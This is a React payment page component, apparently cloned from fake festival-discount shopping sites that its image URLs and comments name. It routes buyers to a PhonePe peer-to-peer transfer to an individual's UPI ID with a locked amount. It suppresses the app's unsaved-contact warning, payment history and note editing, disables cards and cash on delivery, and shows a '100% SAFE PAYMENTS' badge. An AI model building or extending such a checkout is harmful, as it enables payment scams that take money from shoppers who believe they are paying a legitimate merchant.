import React, { useState, useMemo } from "react";
import { ChevronDown, CreditCard, Wallet, ShieldCheck } from "lucide-react";
import { useLocation } from "react-router-dom";

const MERCHANT_UPI_ID = "paytm.s1zwjh8@pty";
const MERCHANT_NAME = "MerchantName";
const COUNTRY_CURRENCY = "INR";

const PaymentPage = () => {
  const location = useLocation();
  const { product, selectedSize, quantity, finalPrice } = location.state || {};

  const [selectedPayment, setSelectedPayment] = useState("");
  const [isReselling, setIsReselling] = useState(false);

  if (!product) {
    return (
      <div className="min-h-screen flex items-center justify-center text-gray-600">
        No Product Found
      </div>
    );
  }

  // ✅ Unique Order ID generate karo
  const orderId = useMemo(() => {
    return `${product.id}-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
  }, [product.id]);

  // ✅ Amount PAISE mein hona chahiye PhonePe native ke liye (rupees × 100)
  const amountInPaise = useMemo(() => {
    return Math.round((finalPrice || 0) * 100);
  }, [finalPrice]);

  // ✅ PhonePe Native P2P Deep Link — same format jo jpolo.salesoffers.online use karta hai
  const phonePeLink = useMemo(() => {
    const payload = {
      contact: {
        cbsName: "ok",
        nickName: MERCHANT_NAME,
        vpa: MERCHANT_UPI_ID,
        type: "VPA",
      },
      p2pPaymentCheckoutParams: {
        note: `OrderNo: ${orderId}`,
        isByDefaultKnownContact: true,
        enableSpeechToText: false,
        allowAmountEdit: false,
        showQrCodeOption: false,
        disableViewHistory: true,
        shouldShowUnsavedContactBanner: false,
        isRecurring: false,
        checkoutType: "DEFAULT",
        transactionContext: "p2p",
        initialAmount: amountInPaise,  // ✅ Paise mein — ₹198 = 19800
        disableNotesEdit: true,
        showKeyboard: true,
        currency: COUNTRY_CURRENCY,
        shouldShowMaskedNumber: true,
      },
    };

    // ✅ JSON ko base64 encode karo — exactly same as reference site
    const base64Data = btoa(JSON.stringify(payload));
    return `phonepe://native?data=${base64Data}&id=p2ppayment`;
  }, [orderId, amountInPaise]);

  // ✅ Universal UPI fallback — agar PhonePe app nahi hai
  const upiLink = useMemo(() => {
    const params = new URLSearchParams({
      pa: MERCHANT_UPI_ID,
      pn: MERCHANT_NAME,
      am: finalPrice?.toString() || "0",
      cu: COUNTRY_CURRENCY,
      tn: `OrderNo: ${orderId}`,
      tr: orderId,
    }).toString();
    return `upi://pay?${params}`;
  }, [finalPrice, orderId]);

  const handlePayClick = () => {
    if (!selectedPayment) {
      alert("Please select a payment method first!");
      return;
    }

    if (selectedPayment === "paytm") {
      alert("Paytm currently unavailable. Please use PhonePe.");
      return;
    }

    if (selectedPayment === "phonepe") {
      // ✅ Step 1: PhonePe native P2P format se open karo
      window.location.href = phonePeLink;

      // ✅ Step 2: Agar 2.5 sec mein app nahi khula → universal UPI fallback
      setTimeout(() => {
        window.location.href = upiLink;
      }, 2500);
    }
  };

  return (
    <div className="min-h-screen bg-white">
      <div className="max-w-md mx-auto">

        {/* ── Header ── */}
        <div className="flex items-center justify-between p-4 border-b">
          <h2 className="text-lg font-semibold text-gray-800">
            Select Payment Method
          </h2>
          <div className="flex items-center gap-1 text-xs text-gray-600">
            <ShieldCheck className="w-4 h-4 text-blue-500" />
            <div>
              <div className="font-semibold">100% SAFE</div>
              <div>PAYMENTS</div>
            </div>
          </div>
        </div>

        {/* ── Online Payment Offer Banner ── */}
        <div className="mx-4 mt-4 bg-pink-50 border border-pink-200 rounded-lg p-4">
          <p className="text-pink-600 font-semibold">
            Pay online & get EXTRA ₹25 off
          </p>
        </div>

        {/* ── Pay Online Section ── */}
        <div className="p-4">
          <p className="text-xs text-gray-500 font-semibold mb-3">PAY ONLINE</p>

          {/* PhonePe */}
          <div className="border rounded-lg mb-3">
            <button
              onClick={() =>
                setSelectedPayment(selectedPayment === "phonepe" ? "" : "phonepe")
              }
              className={`w-full flex items-center justify-between p-4 rounded-lg ${
                selectedPayment === "phonepe" ? "bg-pink-50" : "hover:bg-gray-50"
              }`}
            >
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-full flex items-center justify-center overflow-hidden">
                  <img
                    src="https://kurtikk.diwalioffer.shop/static/media/phonepe.558dd7fea5d980ccf2c8.png"
                    alt="PhonePe"
                    className="w-8 h-8 object-contain"
                  />
                </div>
                <span className="text-sm font-medium text-gray-800">PhonePe</span>
              </div>
              <input
                type="radio"
                name="payment"
                checked={selectedPayment === "phonepe"}
                readOnly
                className="w-5 h-5"
              />
            </button>
          </div>

          {/* Paytm */}
          <div className="border rounded-lg mb-3">
            <button
              onClick={() =>
                setSelectedPayment(selectedPayment === "paytm" ? "" : "paytm")
              }
              className={`w-full flex items-center justify-between p-4 rounded-lg ${
                selectedPayment === "paytm" ? "bg-pink-50" : "hover:bg-gray-50"
              }`}
            >
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-full flex items-center justify-center overflow-hidden">
                  <img
                    src="https://kurtikk.diwalioffer.shop/static/media/paytm_icon-icons.com_62778.a23c686df5f6d427a319.png"
                    alt="Paytm"
                    className="w-8 h-8 object-contain"
                  />
                </div>
                <span className="text-sm font-medium text-gray-800">Paytm</span>
              </div>
              <input
                type="radio"
                name="payment"
                checked={selectedPayment === "paytm"}
                readOnly
                className="w-5 h-5"
              />
            </button>

            {selectedPayment === "paytm" && (
              <p className="text-xs text-red-500 px-4 py-2">
                Paytm currently unavailable. Please use PhonePe.
              </p>
            )}
          </div>

          {/* Debit/Credit Cards (disabled) */}
          <div className="border rounded-lg mb-3 bg-gray-50">
            <button
              disabled
              className="w-full flex items-center justify-between p-4 opacity-50 cursor-not-allowed"
            >
              <div className="flex items-center gap-3">
                <CreditCard className="w-6 h-6 text-blue-500" />
                <span className="text-sm font-medium text-gray-800">
                  Debit/Credit Cards ( Not Available )
                </span>
              </div>
              <ChevronDown className="w-5 h-5 text-gray-400" />
            </button>
          </div>
        </div>

        {/* ── Pay In Cash Section ── */}
        <div className="px-4 pb-4">
          <p className="text-xs text-gray-500 font-semibold mb-3">PAY IN CASE</p>
          <div className="border rounded-lg bg-gray-50">
            <button
              disabled
              className="w-full flex items-center justify-between p-4 opacity-50 cursor-not-allowed"
            >
              <div className="flex items-center gap-3">
                <Wallet className="w-6 h-6 text-blue-500" />
                <span className="text-sm font-medium text-gray-800">
                  Cash on Delivery ( Not Available )
                </span>
              </div>
              <ChevronDown className="w-5 h-5 text-gray-400" />
            </button>
          </div>
        </div>

        {/* ── Reselling Section ── */}
        <div className="px-4 pb-4 border-t pt-4">
          <div className="flex items-center justify-between mb-2">
            <div>
              <h3 className="text-base font-semibold text-gray-800">
                Reselling the Order?
              </h3>
              <p className="text-xs text-gray-500">
                Click on 'Yes' to add Final Price
              </p>
            </div>
            <div className="flex gap-2">
              <button
                onClick={() => setIsReselling(false)}
                className={`px-5 py-2 rounded-full border-2 font-medium text-sm ${
                  !isReselling
                    ? "border-pink-500 text-pink-500"
                    : "border-gray-300 text-gray-600"
                }`}
              >
                No
              </button>
              <button
                onClick={() => setIsReselling(true)}
                className={`px-5 py-2 rounded-full border-2 font-medium text-sm ${
                  isReselling
                    ? "border-pink-500 bg-pink-500 text-white"
                    : "border-gray-300 text-gray-600"
                }`}
              >
                Yes
              </button>
            </div>
          </div>
        </div>

        {/* ── Price Details ── */}
        <div className="px-4 pb-4 border-t pt-4">
          <h3 className="text-base font-semibold text-gray-800 mb-3">
            Price Details ( {quantity} item{quantity > 1 ? "s" : ""} )
          </h3>
          <div className="flex justify-between items-center mb-3">
            <span className="text-sm text-gray-600">Total Product Price</span>
            <span className="text-sm font-medium text-gray-800">
              + ₹{finalPrice}
            </span>
          </div>
          <div className="flex justify-between items-center pt-3 border-t">
            <span className="text-base font-semibold text-gray-800">
              Order Total
            </span>
            <span className="text-lg font-bold text-gray-900">
              ₹{finalPrice}
            </span>
          </div>
        </div>

        {/* ── Pay Button ── */}
        <div className="p-4 border-t">
          <button
            onClick={handlePayClick}
            className="w-full bg-pink-500 hover:bg-pink-600 active:bg-pink-700 text-white font-semibold py-4 rounded-lg transition-colors"
          >
            PROCEED TO PAY ₹{finalPrice}
          </button>
        </div>

      </div>
    </div>
  );
};

export default PaymentPage;